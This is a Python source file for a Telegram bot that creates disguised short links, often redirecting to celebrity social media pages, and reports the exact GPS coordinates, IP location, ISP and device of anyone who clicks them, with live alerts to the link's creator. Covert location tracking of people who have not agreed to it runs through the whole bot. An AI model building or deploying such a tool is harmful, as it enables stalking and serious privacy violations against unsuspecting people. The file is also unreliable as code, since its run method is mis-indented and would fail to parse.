# telegram_bot.py - Complete bot with custom UI
import os
import json
import requests
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import qrcode
from io import BytesIO
import logging

# ============================================
# CONFIGURATION - TOKEN FROM ENVIRONMENT!
# ============================================
BOT_TOKEN = os.environ.get('BOT_TOKEN')  # ← SECRET! Read from environment
SERVER_URL = os.environ.get('SERVER_URL', 'http://localhost:3000')  # Optional

# Check if token is set
if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set! Please set environment variable.")
    exit(1)

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                   level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================
# MAIN BOT CLASS
# ============================================
class LocationTrackerBot:
    def __init__(self, token):
        self.token = token
        self.application = Application.builder().token(token).build()
        self.register_handlers()
        
    def register_handlers(self):
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("create", self.create_link_command))
        self.application.add_handler(CommandHandler("links", self.list_links_command))
        self.application.add_handler(CommandHandler("stats", self.stats_command))
        self.application.add_handler(CommandHandler("monitor", self.monitor_command))
        self.application.add_handler(CallbackQueryHandler(self.handle_callback))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        welcome_text = """
        🚀 <b>WELCOME TO LOCATION TRACKER BOT</b>
        
        I help you track locations of anyone who clicks your links!
        
        <b>How it works:</b>
        1️⃣ Create a tracking link
        2️⃣ Share the link with anyone
        3️⃣ When they click it, I send you their EXACT location
        4️⃣ They get redirected to any URL you choose
        
        <b>Quick Start:</b>
        👇 Click the buttons below to get started!
        """
        
        keyboard = [
            [
                InlineKeyboardButton("🔗 Create Link", callback_data="create_link"),
                InlineKeyboardButton("📋 My Links", callback_data="list_links")
            ],
            [
                InlineKeyboardButton("📊 Statistics", callback_data="stats"),
                InlineKeyboardButton("📡 Live Monitor", callback_data="monitor")
            ],
            [
                InlineKeyboardButton("❓ Help", callback_data="help"),
                InlineKeyboardButton("⚙️ Settings", callback_data="settings")
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            welcome_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        help_text = """
        📖 <b>LOCATION TRACKER BOT - HELP</b>
        
        <b>Commands:</b>
        /start - Start the bot
        /create - Create a new tracking link
        /links - View all your links
        /stats - View statistics
        /monitor - Live monitor mode
        /help - Show this help
        
        <b>How to create a link:</b>
        1. Click "Create Link" button
        2. Enter the URL to redirect to
        3. Get your custom tracking link!
        
        <b>Pro Tips:</b>
        • Use YouTube, TikTok, or any URL
        • Track who clicks your links
        • Get exact GPS coordinates
        • See visitor locations on map
        """
        
        keyboard = [
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            help_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    
    async def create_link_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data['creating_link'] = True
        
        presets = [
            ("🎬 YouTube/MrBeast", "https://www.youtube.com/@MrBeast"),
            ("🎬 YouTube/PewDiePie", "https://www.youtube.com/@PewDiePie"),
            ("📱 TikTok/MrBeast", "https://www.tiktok.com/@mrbeast"),
            ("📸 Instagram/MrBeast", "https://www.instagram.com/mrbeast/"),
            ("🐦 Twitter/MrBeast", "https://twitter.com/MrBeast"),
            ("🎮 Twitch/MrBeast", "https://www.twitch.tv/mrbeast"),
            ("🌐 Custom URL", "custom")
        ]
        
        keyboard = []
        for name, url in presets:
            keyboard.append([InlineKeyboardButton(name, callback_data=f"preset_{url}")])
        
        keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_create")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🔗 <b>CREATE A TRACKING LINK</b>\n\n"
            "Choose where to redirect visitors:\n"
            "Select a preset or choose 'Custom URL'",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    
    async def list_links_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            response = requests.get(f"{SERVER_URL}/dashboard")
            if response.status_code == 200:
                data = response.json()
                links = data.get('links', {})
                
                if not links:
                    await update.message.reply_text(
                        "📋 <b>No links created yet!</b>\n\n"
                        "Create your first link using /create",
                        parse_mode='HTML'
                    )
                    return
                
                message = "📋 <b>YOUR TRACKING LINKS</b>\n\n"
                
                for slug, link in list(links.items())[:10]:
                    visits = link.get('visits', 0)
                    created = link.get('createdAt', 'Unknown')[:10]
                    message += f"🔗 <b>{slug}</b>\n"
                    message += f"   🎯 {link['redirectUrl'][:40]}...\n"
                    message += f"   👤 {visits} visits\n"
                    message += f"   📅 {created}\n\n"
                
                keyboard = [
                    [InlineKeyboardButton("🔗 Create New Link", callback_data="create_link")],
                    [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await update.message.reply_text(
                    message,
                    parse_mode='HTML',
                    reply_markup=reply_markup
                )
            else:
                await update.message.reply_text("❌ Server error. Please try again.")
                
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            response = requests.get(f"{SERVER_URL}/dashboard")
            if response.status_code != 200:
                await update.message.reply_text("❌ Server error")
                return
            
            data = response.json()
            total_links = data.get('totalLinks', 0)
            total_visits = data.get('totalVisits', 0)
            
            visits_response = requests.get(
                f"{SERVER_URL}/api/visits",
                headers={'Authorization': 'Bearer your-secret-password'}
            )
            
            stats_text = f"""
📊 <b>LOCATION TRACKER STATISTICS</b>
━━━━━━━━━━━━━━━━━━━
📌 Total Links: <b>{total_links}</b>
👤 Total Visitors: <b>{total_visits}</b>
━━━━━━━━━━━━━━━━━━━
            """
            
            if visits_response.status_code == 200:
                visits = visits_response.json()
                countries = {}
                cities = {}
                devices = {}
                
                for visit in visits:
                    if visit.get('ipGeo'):
                        country = visit['ipGeo'].get('country', 'Unknown')
                        city = visit['ipGeo'].get('city', 'Unknown')
                        countries[country] = countries.get(country, 0) + 1
                        cities[city] = cities.get(city, 0) + 1
                    
                    ua = visit.get('userAgent', '')
                    if 'Mobile' in ua or 'Android' in ua or 'iPhone' in ua:
                        device = 'Mobile'
                    elif 'Tablet' in ua or 'iPad' in ua:
                        device = 'Tablet'
                    else:
                        device = 'Desktop'
                    devices[device] = devices.get(device, 0) + 1
                
                if countries:
                    stats_text += "\n🌍 <b>Top Countries:</b>\n"
                    for country, count in sorted(countries.items(), key=lambda x: x[1], reverse=True)[:5]:
                        stats_text += f"   {country}: {count} visitors\n"
                
                if cities:
                    stats_text += "\n📍 <b>Top Cities:</b>\n"
                    for city, count in sorted(cities.items(), key=lambda x: x[1], reverse=True)[:5]:
                        stats_text += f"   {city}: {count} visitors\n"
                
                if devices:
                    stats_text += "\n📱 <b>Devices:</b>\n"
                    for device, count in devices.items():
                        stats_text += f"   {device}: {count} visitors\n"
            
            keyboard = [
                [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_stats")],
                [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                stats_text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")
    
    async def monitor_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data['monitoring'] = True
        
        keyboard = [
            [InlineKeyboardButton("⏹ Stop Monitoring", callback_data="stop_monitor")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "📡 <b>LIVE MONITOR MODE ACTIVE</b>\n\n"
            "I'll send you a notification for every new visitor!\n"
            "Click 'Stop Monitoring' to end.",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        
        context.job_queue.run_repeating(
            self.monitor_loop,
            interval=5,
            first=1,
            context=update.effective_chat.id
        )
    
    async def monitor_loop(self, context: ContextTypes.DEFAULT_TYPE):
        chat_id = context.job.context
        
        try:
            response = requests.get(
                f"{SERVER_URL}/api/visits",
                headers={'Authorization': 'Bearer your-secret-password'}
            )
            
            if response.status_code == 200:
                visits = response.json()
                
                if 'last_visit_count' not in context.user_data:
                    context.user_data['last_visit_count'] = len(visits)
                
                if len(visits) > context.user_data['last_visit_count']:
                    new_visits = visits[context.user_data['last_visit_count']:]
                    
                    for visit in new_visits:
                        message = f"""
🔔 <b>NEW VISITOR DETECTED!</b>
━━━━━━━━━━━━━━━━━━━
🕐 Time: {visit.get('timestamp', 'Unknown')}
                        """
                        
                        if visit.get('exactLocation'):
                            loc = visit['exactLocation']
                            message += f"""
🎯 <b>EXACT GPS:</b>
   Latitude: {loc.get('lat')}
   Longitude: {loc.get('lng')}
   Accuracy: ±{loc.get('accuracy', '?')}m
🗺️ https://www.google.com/maps?q={loc.get('lat')},{loc.get('lng')}
                            """
                            
                            await context.bot.send_location(
                                chat_id=chat_id,
                                latitude=loc.get('lat'),
                                longitude=loc.get('lng')
                            )
                        elif visit.get('ipGeo'):
                            geo = visit['ipGeo']
                            message += f"""
📍 <b>IP LOCATION:</b>
   City: {geo.get('city', 'Unknown')}
   Country: {geo.get('country', 'Unknown')}
   Region: {geo.get('regionName', 'Unknown')}
   ISP: {geo.get('isp', 'Unknown')}
                            """
                        
                        message += f"""
📱 Device: {visit.get('userAgent', 'Unknown')[:50]}
━━━━━━━━━━━━━━━━━━━
                        """
                        
                        await context.bot.send_message(
                            chat_id=chat_id,
                            text=message,
                            parse_mode='HTML'
                        )
                    
                    context.user_data['last_visit_count'] = len(visits)
                    
        except Exception as e:
            logger.error(f"Monitor error: {e}")
    
    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        data = query.data
        
        if data == "create_link":
            await self.create_link_command(update, context)
        
        elif data.startswith("preset_"):
            url = data.replace("preset_", "")
            
            if url == "custom":
                await query.edit_message_text(
                    "✏️ <b>Enter your custom URL</b>\n\n"
                    "Send me the full URL you want to redirect to.\n"
                    "Example: https://www.youtube.com/@MrBeast\n\n"
                    "Or click 'Cancel' to go back.",
                    parse_mode='HTML',
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_create")]
                    ])
                )
                context.user_data['awaiting_custom_url'] = True
                return
            
            context.user_data['redirect_url'] = url
            
            await query.edit_message_text(
                f"✅ Redirect URL set to:\n<code>{url}</code>\n\n"
                "Now enter a custom slug (short name) for your link.\n"
                "Example: <code>mycoolvideo</code>\n\n"
                "Your link will be: <code>your-domain.com/mycoolvideo</code>\n\n"
                "Or just click 'Generate Random'",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🎲 Generate Random", callback_data="random_slug")],
                    [InlineKeyboardButton("❌ Cancel", callback_data="cancel_create")]
                ])
            )
            context.user_data['awaiting_slug'] = True
        
        elif data == "random_slug":
            import random
            import string
            slug = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
            
            await query.edit_message_text(
                f"🎲 Random slug generated: <code>{slug}</code>\n\n"
                "Finalizing link creation...",
                parse_mode='HTML'
            )
            
            await self.finalize_link(update, context, slug)
        
        elif data == "list_links":
            await self.list_links_command(update, context)
        
        elif data == "stats":
            await self.stats_command(update, context)
        
        elif data == "refresh_stats":
            await self.stats_command(update, context)
        
        elif data == "monitor":
            await self.monitor_command(update, context)
        
        elif data == "stop_monitor":
            context.user_data['monitoring'] = False
            current_jobs = context.job_queue.jobs()
            for job in current_jobs:
                if job.context == update.effective_chat.id:
                    job.schedule_removal()
            
            await query.edit_message_text(
                "⏹ Monitoring stopped.\n\n"
                "Use /monitor to start again.",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]
                ])
            )
        
        elif data == "help":
            await self.help_command(update, context)
        
        elif data == "settings":
            keyboard = [
                [InlineKeyboardButton("🔔 Notifications", callback_data="notif_settings")],
                [InlineKeyboardButton("🌐 Server URL", callback_data="server_settings")],
                [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                "⚙️ <b>SETTINGS</b>\n\n"
                "Customize your bot experience:",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        
        elif data == "cancel_create":
            context.user_data.clear()
            await query.edit_message_text(
                "❌ Creation cancelled.\n\n"
                "Click below to start over:",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Create New Link", callback_data="create_link")],
                    [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]
                ])
            )
        
        elif data == "back_to_start":
            await self.start_command(update, context)
    
    async def finalize_link(self, update: Update, context: ContextTypes.DEFAULT_TYPE, slug):
        redirect_url = context.user_data.get('redirect_url')
        
        if not redirect_url:
            await update.effective_message.reply_text("❌ Error: No URL set")
            return
        
        try:
            response = requests.post(
                f"{SERVER_URL}/create-link",
                json={
                    'redirectUrl': redirect_url,
                    'customSlug': slug,
                    'title': f"Link created via Telegram"
                }
            )
            
            if response.status_code == 200:
                data = response.json()
                
                qr = qrcode.QRCode(version=1, box_size=10, border=5)
                qr.add_data(data['shortUrl'])
                qr.make(fit=True)
                img = qr.make_image(fill_color="black", back_color="white")
                
                bio = BytesIO()
                img.save(bio, 'PNG')
                bio.seek(0)
                
                message = f"""
✅ <b>LINK CREATED SUCCESSFULLY!</b>
━━━━━━━━━━━━━━━━━━━
🔗 <b>Your Link:</b>
<code>{data['shortUrl']}</code>

🎯 <b>Redirects to:</b>
<code>{data['redirectUrl']}</code>

📊 <b>Stats:</b>
   Visitors: 0
   Created: {datetime.now().strftime('%Y-%m-%d %H:%M')}

📱 <b>Share this link:</b>
Anyone who clicks it will be tracked!
━━━━━━━━━━━━━━━━━━━
                """
                
                await context.bot.send_photo(
                    chat_id=update.effective_chat.id,
                    photo=bio,
                    caption=f"📱 Scan QR code to visit: {data['shortUrl']}"
                )
                
                keyboard = [
                    [InlineKeyboardButton("📋 My Links", callback_data="list_links")],
                    [InlineKeyboardButton("📊 Stats", callback_data="stats")],
                    [InlineKeyboardButton("🔗 Create Another", callback_data="create_link")],
                    [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await update.effective_message.reply_text(
                    message,
                    parse_mode='HTML',
                    reply_markup=reply_markup
                )
                
                context.user_data.clear()
                
            else:
                await update.effective_message.reply_text(f"❌ Server error: {response.text}")
                
        except Exception as e:
            await update.effective_message.reply_text(f"❌ Error: {e}")
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        text = update.message.text
        
        if context.user_data.get('awaiting_custom_url'):
            context.user_data['redirect_url'] = text
            context.user_data['awaiting_custom_url'] = False
            
            await update.message.reply_text(
                f"✅ URL set to: <code>{text}</code>\n\n"
                "Now enter a custom slug (short name) for your link:",
                parse_mode='HTML'
            )
            context.user_data['awaiting_slug'] = True
            return
        
        if context.user_data.get('awaiting_slug'):
            slug = text.replace(' ', '_').lower()
            
            if not slug.isalnum() and '_' not in slug and '-' not in slug:
                await update.message.reply_text(
                    "❌ Invalid slug. Use only letters, numbers, underscores, or hyphens.\n"
                    "Please try again:"
                )
                return
            
            await self.finalize_link(update, context, slug)
            context.user_data['awaiting_slug'] = False
            return
        
        await update.message.reply_text(
            "I don't understand that command.\n"
            "Use /start to see available options.",
            parse_mode='HTML'
        )
    
    def run(self):
    print("🚀 Bot is running...")
    try:
        self.application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        print(f"❌ Bot error: {e}")
        raise

if __name__ == '__main__':
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not set! Please set environment variable.")
        exit(1)
    
    bot = LocationTrackerBot(BOT_TOKEN)
    bot.run()
